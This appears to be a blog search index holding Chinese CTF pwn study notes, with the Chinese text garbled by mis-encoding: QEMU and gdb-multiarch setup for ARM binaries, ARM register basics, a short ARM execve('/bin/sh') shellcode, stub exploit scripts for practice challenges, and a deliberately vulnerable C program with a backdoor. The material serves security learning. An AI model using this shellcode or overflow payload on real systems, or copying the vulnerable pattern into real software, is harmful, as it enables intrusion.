class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt install  gdb-multiarch<br></code></pre></td></tr></table></figure><p>é¦–å…ˆæˆ‘ä»¬é€šè¿‡ qemu ä»¥è°ƒè¯•æ¨¡å¼è¿è¡Œç¨‹åºï¼Œ<code>-g</code>å‚æ•°è¡¨ç¤ºè®¾ç½®ä¸ºè°ƒè¯•æ¨¡å¼ï¼Œ<code>1234</code>è¡¨ç¤ºç¨‹åºæ˜ å°„çš„ç«¯å£ã€‚</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">qemu-arm-<span class="hljs-keyword">static</span> -g <span class="hljs-number">1234</span> ./demo<br></code></pre></td></tr></table></figure><p>ç„¶åè¿è¡Œ<code>gdb-multiarch</code>ï¼Œå¹¶æ ¹æ®æ¶æ„å’Œç«¯åºè®¾ç½®å‚æ•°ã€‚</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gams">gdb-multiarch<br><span class="hljs-keyword">set</span> architecture <span class="hljs-comment">arm</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">endian little</span><br></code></pre></td></tr></table></figure><p>ç„¶åè¿æ¥æ˜ å°„ç¨‹åºçš„ç«¯å£</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">target</span> remote localhost:<span class="hljs-number">1234</span><br></code></pre></td></tr></table></figure><h2 id="è¿è¡Œè°ƒè¯•"><a href="#è¿è¡Œè°ƒè¯•" class="headerlink" title="è¿è¡Œè°ƒè¯•"></a>è¿è¡Œè°ƒè¯•</h2><ul><li>è¿è¡Œ arm åŠ¨æ€é“¾æ¥ç¨‹åº</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">qemu-arm -L /usr/arm-linux-gnueabi ./pwn<br></code></pre></td></tr></table></figure><ul><li>è¿è¡Œ aarch64 åŠ¨æ€é“¾æ¥ç¨‹åº</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">qemu-aarch64 -L /usr/aarch64-linux-gnu ./pwn<br></code></pre></td></tr></table></figure><ul><li>è¿è¡Œé™æ€é“¾æ¥ç¨‹åº</li></ul><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">qemu-arm-<span class="hljs-keyword">static</span> ./pwn<br>qemu-aarch64-<span class="hljs-keyword">static</span> ./pwn<br></code></pre></td></tr></table></figure><ul><li>è°ƒè¯•ç¨‹åº</li></ul><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gams">gdb-multiarch pwn -q<br><span class="hljs-keyword">set</span> architecture <span class="hljs-comment">arm</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">architecture aarch64</span><br>target <span class="hljs-comment">remote localhost:1234</span><br></code></pre></td></tr></table></figure><h2 id="ARM-æ¶æ„çŸ¥è¯†"><a href="#ARM-æ¶æ„çŸ¥è¯†" class="headerlink" title="ARM æ¶æ„çŸ¥è¯†"></a>ARM æ¶æ„çŸ¥è¯†</h2><p>ARM 32 ä½å’Œ Aarch 64 ä½æ¶æ„çš„åŸºæœ¬åŒºåˆ«</p><p> ARM 32 ä½ï¼ˆARMv7 æˆ–ä¹‹å‰ç‰ˆæœ¬ï¼‰</p><ul><li><strong>å¯„å­˜å™¨æ•°é‡</strong>ï¼šARM 32 ä½æ¶æ„é€šå¸¸æœ‰ 16 ä¸ªé€šç”¨å¯„å­˜å™¨ï¼ˆR0 åˆ° R15ï¼‰ã€‚</li><li><strong>æŒ‡ä»¤é›†</strong>ï¼šæ”¯æŒ ARM å’Œ THUMB ä¸¤ç§æ¨¡å¼ï¼š<ul><li><strong>ARM æ¨¡å¼</strong>ï¼š32 ä½æŒ‡ä»¤ï¼Œé€šå¸¸æ¯ä¸ªæŒ‡ä»¤é•¿åº¦ä¸º 32 ä½ã€‚</li><li><strong>THUMB æ¨¡å¼</strong>ï¼š16 ä½æŒ‡ä»¤ï¼Œå‡å°‘äº†æŒ‡ä»¤é•¿åº¦ï¼Œé€šå¸¸é€‚ç”¨äºèµ„æºå—é™çš„ç³»ç»Ÿã€‚</li></ul></li><li><strong>å †æ ˆå’Œå†…å­˜</strong>ï¼šä¸€èˆ¬æƒ…å†µä¸‹ï¼Œå†…å­˜å¯»å€èŒƒå›´ä¸º 4GBã€‚</li><li><strong>ç³»ç»Ÿè°ƒç”¨</strong>ï¼šé€šè¿‡å¯„å­˜å™¨å’Œä¸­æ–­å‘å†…æ ¸è¯·æ±‚æœåŠ¡ã€‚</li></ul><p> ARM 64 ä½ï¼ˆARMv8 æˆ–ä¹‹åç‰ˆæœ¬ï¼‰</p><ul><li><strong>å¯„å­˜å™¨æ•°é‡</strong>ï¼šARM 64 ä½æ¶æ„æä¾› 31 ä¸ªé€šç”¨å¯„å­˜å™¨ï¼ˆX0 åˆ° X30ï¼‰ï¼Œå…¶ä¸­ <code>X30</code> ç”¨ä½œé“¾æ¥å¯„å­˜å™¨ï¼ˆLRï¼‰ã€‚</li><li><strong>æŒ‡ä»¤é›†</strong>ï¼šARMv8 å¼•å…¥äº† AArch64 æ¨¡å¼ï¼Œå®Œå…¨ä¸åŒäº 32 ä½çš„ AArch32 æ¨¡å¼ã€‚64 ä½æ¶æ„çš„æŒ‡ä»¤é›†ä¸ 32 ä½ç›¸æ¯”æ›´åŠ ç®€æ´ï¼Œä¼˜åŒ–äº†æŒ‡ä»¤é•¿åº¦å’ŒåŠŸèƒ½ã€‚<ul><li><strong>AArch64 æ¨¡å¼</strong>ï¼šæ‰€æœ‰æŒ‡ä»¤éƒ½æ˜¯ 64 ä½ã€‚</li><li><strong>AArch32 æ¨¡å¼</strong>ï¼šå‘åå…¼å®¹ ARMv7 ç­‰ 32 ä½æ¨¡å¼ï¼Œæ”¯æŒ 32 ä½æŒ‡ä»¤ã€‚</li></ul></li><li><strong>å†…å­˜å¯»å€</strong>ï¼šæ”¯æŒæ›´å¤§å†…å­˜å¯»å€ç©ºé—´ï¼ˆæœ€é«˜æ”¯æŒ 16 EB çš„åœ°å€ç©ºé—´ï¼‰ã€‚</li></ul><p><img src="/../../Mobile/%E6%A8%A1%E6%8B%9F/assets/Pasted%20image%2020241125212837.png"></p><p><img src="/../../Mobile/%E6%A8%A1%E6%8B%9F/assets/Pasted%20image%2020241125212844.png"></p><p>arm è¿è¡Œæ¨¡å¼</p><ul><li>ç”¨æˆ·æ¨¡å¼ï¼ˆUSRï¼‰ï¼šARMå¤„ç†å™¨æ­£å¸¸ç¨‹åºæ‰§è¡ŒçŠ¶æ€ã€‚</li><li>å¿«é€Ÿä¸­æ–­æ¨¡å¼ï¼ˆFIQï¼‰ï¼šé«˜é€Ÿæ•°æ®ä¼ è¾“æˆ–é€šé“å¤„ç†ã€‚</li><li>å¤–éƒ¨ä¸­æ–­æ¨¡å¼ï¼ˆIRQï¼‰ï¼šé€šç”¨çš„ä¸­æ–­æ¨¡å¼ã€‚</li><li>ç®¡ç†æ¨¡å¼ï¼ˆSVCï¼‰ï¼šæ“ä½œç³»ç»Ÿä½¿ç”¨çš„ä¿æŠ¤æ¨¡å¼ã€‚</li><li>æ•°æ®è®¿é—®ç»ˆæ­¢æ¨¡å¼ï¼ˆABTï¼‰ï¼šå½“æ•°æ®æˆ–æŒ‡ä»¤é¢„å–ç»ˆæ­¢æ—¶è¿›å…¥è¯¥æ¨¡å¼ï¼Œå¯ç”¨äºè™šæ‹Ÿå­˜å‚¨åŠå­˜å‚¨ä¿æŠ¤ã€‚</li><li>ç³»ç»Ÿæ¨¡å¼ï¼ˆSYSï¼‰ï¼šè¿è¡Œå…·æœ‰ç‰¹æƒçš„æ“ä½œç³»ç»Ÿä»»åŠ¡ã€‚</li><li>æœªå®šä¹‰æŒ‡å®šç»ˆæ­¢æ¨¡å¼ï¼ˆUNDï¼‰ï¼šæœªå®šä¹‰çš„æŒ‡ä»¤æ‰§è¡Œæ˜¯è¿›å…¥è¯¥æ¨¡å¼</li></ul><h2 id="æ±‡ç¼–åŸºç¡€"><a href="#æ±‡ç¼–åŸºç¡€" class="headerlink" title="æ±‡ç¼–åŸºç¡€"></a>æ±‡ç¼–åŸºç¡€</h2><h3 id="å¯„å­˜å™¨"><a href="#å¯„å­˜å™¨" class="headerlink" title="å¯„å­˜å™¨"></a>å¯„å­˜å™¨</h3><table><thead><tr><th>å¯„å­˜å™¨</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>X0 å¯„å­˜å™¨</td><td>ç”¨æ¥ä¿å­˜è¿”å›å€¼ï¼ˆæˆ–ä¼ å‚ï¼‰</td></tr><tr><td>X1 ~ X7 å¯„å­˜å™¨</td><td>ç”¨æ¥ä¿å­˜å‡½æ•°çš„ä¼ å‚</td></tr><tr><td>X8å¯„å­˜å™¨</td><td>ä¹Ÿå¯ä»¥ç”¨æ¥ä¿å­˜è¿”å›å€¼</td></tr><tr><td>X9 ~ X28å¯„å­˜å™¨</td><td>ä¸€èˆ¬å¯„å­˜å™¨ï¼Œæ— ç‰¹æ®Šç”¨é€”</td></tr><tr><td>x29(FP)å¯„å­˜å™¨</td><td>ç”¨æ¥ä¿å­˜æ ˆåº•åœ°å€</td></tr><tr><td>X30 (LR)å¯„å­˜å™¨</td><td>ç”¨æ¥ä¿å­˜è¿”å›åœ°å€</td></tr><tr><td>X31(SP) å¯„å­˜å™¨</td><td>ç”¨æ¥ä¿å­˜æ ˆé¡¶åœ°å€</td></tr><tr><td>X31(ZR)å¯„å­˜å™¨</td><td>é›¶å¯„å­˜å™¨ï¼Œæ’ä¸º0</td></tr><tr><td>X32(PC)å¯„å­˜å™¨</td><td>ç”¨æ¥ä¿å­˜å½“å‰æ‰§è¡Œçš„æŒ‡ä»¤çš„åœ°å€</td></tr></tbody></table><h3 id="æŒ‡ä»¤æ ¼å¼"><a href="#æŒ‡ä»¤æ ¼å¼" class="headerlink" title="æŒ‡ä»¤æ ¼å¼"></a>æŒ‡ä»¤æ ¼å¼</h3><ol><li>LDMIA R0,{R1,R2,R3,R4}</li></ol><p>LDMä¸ºï¼šå¤šå¯„å­˜å™¨ â€œå†…å­˜å–â€ æŒ‡ä»¤ IA è¡¨ç¤ºæ¯æ¬¡ LDM æŒ‡ä»¤ç»“æŸä¹‹å R0 å¢åŠ  1 ä¸ªå­— æœ€ç»ˆç»“æœä¸º<code>R1=[R0],R1=[R0+#4],R1=[R0+#8],R1=[R0+#0xC]</code></p><ol start="2"><li>å †æ ˆå¯»å€ï¼ˆFAã€EAã€FDã€EDï¼‰</li></ol><p>STMFD SPï¼ï¼Œ{R1-R7,LR}@å°† R1-R7 ä»¥åŠ LR å…¥æ ˆ LDMFD SP!ï¼Œ{}</p><h3 id="å¯»å€æ–¹å¼"><a href="#å¯»å€æ–¹å¼" class="headerlink" title="å¯»å€æ–¹å¼"></a>å¯»å€æ–¹å¼</h3><h3 id="å¸¸ç”¨æŒ‡ä»¤"><a href="#å¸¸ç”¨æŒ‡ä»¤" class="headerlink" title="å¸¸ç”¨æŒ‡ä»¤"></a>å¸¸ç”¨æŒ‡ä»¤</h3><h2 id="å‡½æ•°è°ƒç”¨çº¦å®š"><a href="#å‡½æ•°è°ƒç”¨çº¦å®š" class="headerlink" title="å‡½æ•°è°ƒç”¨çº¦å®š"></a>å‡½æ•°è°ƒç”¨çº¦å®š</h2><p>arm çš„å‡½æ•°è°ƒç”¨çº¦å®š</p><h2 id="ç³»ç»Ÿè°ƒç”¨"><a href="#ç³»ç»Ÿè°ƒç”¨" class="headerlink" title="ç³»ç»Ÿè°ƒç”¨"></a>ç³»ç»Ÿè°ƒç”¨</h2><h2 id="shellcodeç¼–å†™"><a href="#shellcodeç¼–å†™" class="headerlink" title="shellcodeç¼–å†™"></a>shellcodeç¼–å†™</h2><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs avrasm">.section .text<br>.globl _start<br><br><span class="hljs-symbol">_start:</span><br><span class="hljs-keyword">movw</span> <span class="hljs-built_in">r5</span>,<span class="hljs-meta">#0x732f</span><br>movt <span class="hljs-built_in">r5</span>,<span class="hljs-number">0x68</span><br><span class="hljs-keyword">push</span> &#123;<span class="hljs-built_in">r5</span>&#125;<br><span class="hljs-keyword">movw</span> <span class="hljs-built_in">r5</span>,<span class="hljs-meta">#0x622f</span><br>movt <span class="hljs-built_in">r5</span>,<span class="hljs-meta">#0x6e69</span><br><span class="hljs-keyword">push</span> &#123;<span class="hljs-built_in">r5</span>&#125;<br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r0</span>,sp<br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r7</span>,<span class="hljs-meta">#0xb</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r1</span>,<span class="hljs-meta">#0</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r2</span>,<span class="hljs-meta">#0</span><br>svc <span class="hljs-meta">#0</span><br></code></pre></td></tr></table></figure><p>å…ˆçœ‹ä¸€ä¸‹ arm çš„å‡½æ•°è°ƒç”¨çº¦å®šï¼Œå‡½æ•°çš„ç¬¬ 1<del>4 ä¸ªå‚æ•°åˆ†åˆ«ä¿å­˜åœ¨&#96;r0</del>r3<code>å¯„å­˜å™¨ä¸­ï¼Œå‰©ä¸‹çš„å‚æ•°ä»å³å¾€å·¦ä¾æ¬¡å…¥æ ˆï¼Œè¢«è°ƒç”¨è€…å®ç°æ ˆå¹³è¡¡ï¼Œå‡½æ•°çš„è¿”å›å€¼ä¿å­˜åœ¨</code>r0&#96;ä¸­ã€‚</p><p><img src="/assets/Pasted%20image%2020241126225847.png"></p><p>é™¤æ­¤ä¹‹å¤–ï¼Œarm çš„<code>b/bl</code>ç­‰æŒ‡ä»¤å®ç°è·³è½¬ï¼›<code>pc</code>å¯„å­˜å™¨ç›¸å½“äºx86çš„<code>eip</code>ï¼Œä¿å­˜ä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€ï¼Œä¹Ÿæ˜¯æˆ‘ä»¬è¦æ§åˆ¶çš„ç›®æ ‡ã€‚</p><h2 id="ä¾‹é¢˜"><a href="#ä¾‹é¢˜" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h2><h3 id="jarvisoj-typo"><a href="#jarvisoj-typo" class="headerlink" title="jarvisoj_typo"></a>jarvisoj_typo</h3><ul><li>åˆ†æ</li></ul><p><code>file</code>æŸ¥çœ‹ç¨‹åºå‘ç°ä¸º arm32 ä½æ¶æ„ï¼Œå¹¶ä¸”æ˜¯é™æ€é“¾æ¥çš„ã€‚</p><p><code>checksec</code>æŸ¥ä¿æŠ¤å‘ç°ç¨‹åºæ²¡æœ‰æ ˆæº¢å‡ºå’Œ PIE ä¿æŠ¤ï¼Œæˆ‘ä»¬åªéœ€è¦è¿›è¡Œæ ˆæº¢å‡ºæ”»å‡»å³å¯ã€‚</p><p><img src="/assets/Pasted%20image%2020250106092650.png"></p><p>æˆ‘ä»¬å¯ä»¥åœ¨æ–‡ä»¶ä¸­æ‰¾åˆ°<code>system</code>ç­‰å±é™©å‡½æ•°å’Œ<code>/bin/sh</code>å­—ç¬¦ä¸²ã€‚</p><p>æˆ‘ä»¬é€šè¿‡ ROPgadget æ¥æœç´¢ç¨‹åºä¸­çš„onegadgetã€‚</p><ul><li>exp</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">from</span> pwncli <span class="hljs-keyword">import</span> *<br>  <br>cli_script()<br>io=gift[<span class="hljs-string">&quot;io&quot;</span>]<br>elf=gift[<span class="hljs-string">&quot;elf&quot;</span>]<br>  <br>sh=<span class="hljs-number">0x00064384</span><br>r0_r4_pc=<span class="hljs-number">0x00020904</span><br>  <br>ia()<br></code></pre></td></tr></table></figure><h3 id="Dest0g3-520è¿æ–°èµ›-ez-aarch"><a href="#Dest0g3-520è¿æ–°èµ›-ez-aarch" class="headerlink" title="[Dest0g3 520è¿æ–°èµ›]ez_aarch"></a>[Dest0g3 520è¿æ–°èµ›]ez_aarch</h3><ul><li><p>åˆ†æ</p></li><li><p>exp</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io=remote(<span class="hljs-string">&quot;node5.buuoj.cn&quot;</span>,<span class="hljs-number">29093</span>)<br>payload = <span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">40</span> + <span class="hljs-string">b&quot;\x50&quot;</span><br>io.recv()<br>io.send(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure><h3 id="shanghai2018-baby-arm"><a href="#shanghai2018-baby-arm" class="headerlink" title="shanghai2018_baby_arm"></a>shanghai2018_baby_arm</h3><p>ç¼–è¯‘ä»£ç <code>arm-linux-guneabi-gcc vuln.c -o vuln</code>åŠ¨æ€è°ƒè¯•åˆ†æ</p><p>åˆ©ç”¨qemuè¿è¡Œç¨‹åº</p><p><code>qemu-arm -L /usr/arm-linux-gnueabi -g 8888 ./vuln aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa gdb-multiarch ./vuln</code></p><h3 id="éª‡ææ¯-2018-babyarm"><a href="#éª‡ææ¯-2018-babyarm" class="headerlink" title="éª‡ææ¯_2018_babyarm"></a>éª‡ææ¯_2018_babyarm</h3><ul><li>ret2text</li><li>ret2libc</li><li>ret2syscall</li><li>ret2shellcode</li></ul><blockquote><p><a href="https://zhuanlan.zhihu.com/p/388683540">ARMæ±‡ç¼–å…¥é—¨æŒ‡å— - çŸ¥ä¹</a><br><a href="https://chan-shaw.github.io/2020/03/20/arm%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">armæ±‡ç¼–è¯­è¨€å­¦ä¹ ç¬”è®° | å®‰å’Œæ¡¥å—ä¸¶çš„åšå®¢</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å¼‚æ¶æ„ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C++ Pwn</title>
      <link href="/2025/07/01/ctf/adv/cpp/"/>
      <url>/2025/07/01/ctf/adv/cpp/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>æ ˆåˆ©ç”¨æ€è€ƒ</title>
      <link href="/2025/07/01/ctf/stack/stack/"/>
      <url>/2025/07/01/ctf/stack/stack/</url>
      
        <content type="html"><![CDATA[<h2 id="æ ˆæ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#æ ˆæ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="æ ˆæ˜¯ä»€ä¹ˆï¼Ÿ"></a>æ ˆæ˜¯ä»€ä¹ˆï¼Ÿ</h2><p>æ ˆï¼ˆStackï¼‰ä¸€èˆ¬è¡¨ç¤ºè®¡ç®—æœºä¸­ä¸€ç§å†…å­˜åŒºåŸŸï¼Œç”¨äºå­˜å‚¨ç¨‹åºåœ¨è¿è¡Œè¿‡ç¨‹ä¸­éœ€è¦ç®¡ç†çš„å±€éƒ¨å˜é‡ã€ã€å‡½æ•°è°ƒç”¨ã€ã€è¿”å›åœ°å€ç­‰æ•°æ®ã€‚</p><p>æ ˆçš„ç‰¹ç‚¹æ˜¯åè¿›å…ˆå‡ºï¼ˆLIFOï¼‰ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œï¼Œæ ˆä¸­çš„æ•°æ®æŒ‰ç…§å…ˆè¿›åå‡ºçš„é¡ºåºè¿›è¡Œè®¿é—®ã€‚</p><h3 id="ä¸ºä»€ä¹ˆæˆ‘ä»¬éœ€è¦æ ˆå†…å­˜"><a href="#ä¸ºä»€ä¹ˆæˆ‘ä»¬éœ€è¦æ ˆå†…å­˜" class="headerlink" title="ä¸ºä»€ä¹ˆæˆ‘ä»¬éœ€è¦æ ˆå†…å­˜"></a>ä¸ºä»€ä¹ˆæˆ‘ä»¬éœ€è¦æ ˆå†…å­˜</h3><p>æ ˆå†…å­˜çš„å­˜åœ¨ä¸»è¦æ˜¯ä¸ºäº†é«˜æ•ˆç®¡ç†å‡½æ•°è°ƒç”¨çš„å±€éƒ¨å˜é‡ã€è¿”å›åœ°å€ä»¥åŠå…¶ä»–ä¸å‡½æ•°æ‰§è¡Œç›¸å…³çš„ä¸´æ—¶æ•°æ®ã€‚å®ƒä¸ºå‡½æ•°è°ƒç”¨æä¾›äº†è‡ªåŠ¨åŒ–çš„å†…å­˜ç®¡ç†ï¼Œä½¿å¾—ç¨‹åºå¯ä»¥åœ¨ä¸éœ€è¦æ‰‹åŠ¨å¹²é¢„çš„æƒ…å†µä¸‹é«˜æ•ˆåœ°åˆ†é…å’Œå›æ”¶å†…å­˜ã€‚</p><p>æ ˆä¸­å­˜åœ¨æœ‰å“ªäº›æ•°æ®ï¼Ÿ</p><ul><li>ä¸´æ—¶å˜é‡</li><li>ç”¨æˆ·æ•°æ®</li><li>ç¯å¢ƒå˜é‡</li></ul><h3 id="æ ˆå’Œå †çš„åŒºåˆ«"><a href="#æ ˆå’Œå †çš„åŒºåˆ«" class="headerlink" title="æ ˆå’Œå †çš„åŒºåˆ«"></a>æ ˆå’Œå †çš„åŒºåˆ«</h3><p>å¤„ç†é€Ÿåº¦</p><h3 id="ç›¸å…³çš„æ¼æ´æœ‰å“ªäº›ï¼Ÿ"><a href="#ç›¸å…³çš„æ¼æ´æœ‰å“ªäº›ï¼Ÿ" class="headerlink" title="ç›¸å…³çš„æ¼æ´æœ‰å“ªäº›ï¼Ÿ"></a>ç›¸å…³çš„æ¼æ´æœ‰å“ªäº›ï¼Ÿ</h3><p>æ ˆå†…å­˜å¸¸è§çš„æ¼æ´ä¸»è¦æ˜¯ä¸æ ˆæº¢å‡ºï¼ˆStack Overflowï¼‰ç›¸å…³ã€‚æ ˆæº¢å‡ºæ˜¯æŒ‡æ ˆç©ºé—´çš„åˆ†é…è¶…å‡ºäº†ç³»ç»Ÿä¸ºæ ˆåˆ†é…çš„é™åˆ¶ï¼Œä»è€Œå¯¼è‡´ç¨‹åºå‡ºç°å¼‚å¸¸è¡Œä¸ºæˆ–è¢«æ”»å‡»è€…åˆ©ç”¨ã€‚</p><h2 id="æ¼æ´åˆ©ç”¨åŸç†"><a href="#æ¼æ´åˆ©ç”¨åŸç†" class="headerlink" title="æ¼æ´åˆ©ç”¨åŸç†"></a>æ¼æ´åˆ©ç”¨åŸç†</h2><h3 id="å‡½æ•°è°ƒç”¨æµç¨‹"><a href="#å‡½æ•°è°ƒç”¨æµç¨‹" class="headerlink" title="å‡½æ•°è°ƒç”¨æµç¨‹"></a>å‡½æ•°è°ƒç”¨æµç¨‹</h3><p>ä¸€èˆ¬æ ˆæº¢å‡ºæ¼æ´çš„åˆ©ç”¨éƒ½æ˜¯é€šè¿‡ã€‚æ®ç»“åˆä¸åŒçš„æœºåˆ¶ï¼Œè¯ç”Ÿäº†å¯¹æ ˆæº¢å‡ºæ¼æ´çš„å¤šç§åˆ©ç”¨æ‰‹æ³•ã€‚</p><h3 id="æ¼æ´æ ·æœ¬"><a href="#æ¼æ´æ ·æœ¬" class="headerlink" title="æ¼æ´æ ·æœ¬"></a>æ¼æ´æ ·æœ¬</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//gcc -fno-stack-protector -no-pie vuln.c -o vuln</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">backdoor</span><span class="hljs-params">()</span>&#123;<br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">20</span>];<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;input:&quot;</span>);<br>    read(<span class="hljs-number">0</span>,buf,<span class="hljs-number">0x20</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="åˆ©ç”¨æµç¨‹"><a href="#åˆ©ç”¨æµç¨‹" class="headerlink" title="åˆ©ç”¨æµç¨‹"></a>åˆ©ç”¨æµç¨‹</h3><h3 id="åˆ©ç”¨æ‰‹æ³•"><a href="#åˆ©ç”¨æ‰‹æ³•" class="headerlink" title="åˆ©ç”¨æ‰‹æ³•"></a>åˆ©ç”¨æ‰‹æ³•</h3><ul><li>ret2text</li><li>ret2libc</li><li>ret2shellcode</li><li>ret2syscall</li></ul><h3 id="æ¶æ„åŒºåˆ«"><a href="#æ¶æ„åŒºåˆ«" class="headerlink" title="æ¶æ„åŒºåˆ«"></a>æ¶æ„åŒºåˆ«</h3><p>x86æ¶æ„å’Œx64æ¶æ„çš„åŒºåˆ«åœ¨äºä¼ å‚æ–¹å¼ã€‚</p><h2 id="åè¨€"><a href="#åè¨€" class="headerlink" title="åè¨€"></a>åè¨€</h2>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Stack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä»£å®¡å’ŒFuzzingè®­ç»ƒ1</title>
      <link href="/2025/07/01/fuzz/cve/chap1/"/>
      <url>/2025/07/01/fuzz/cve/chap1/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="8c8714bee3e10e5d8fa9b1a2c2305c99ba04f569cd44962d294b267768fc8115">348d2dcafb97cf7fd5de5b11bc368b101bb387e6746b15f5877dd43c1ce50fd2</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">æœ¬æ–‡å·²åŠ å¯†ï¼Œè¯·è¾“å…¥å¯†ç æŸ¥çœ‹ã€‚</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> Fuzz </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
